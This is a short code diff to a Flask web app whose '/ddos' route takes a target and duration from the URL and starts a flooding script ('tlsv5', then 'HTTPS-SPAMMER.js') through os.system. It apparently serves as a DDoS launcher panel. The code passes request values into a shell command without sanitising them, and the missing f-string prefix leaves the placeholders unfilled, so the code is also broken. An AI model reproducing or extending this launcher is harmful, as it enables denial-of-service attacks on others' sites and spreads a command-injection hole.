@@ -5,10 +5,9 @@ app = Flask(__name__)
 
 @app.route('/ddos')
 def ddos():
-    target = request.args.get('target', 'example.com')
-    duration = request.args.get('duration', '10')
-    rate = request.args.get('rate', '100')
-    os.system("node tlsv5 {target} {duration} {rate} 24 p.txt")
+    target = request.args.get('target')
+    duration = request.args.get('duration')
+    os.system("node HTTPS-SPAMMER.js {target} {duration}")
 
     return 'DDoS attack started'
 
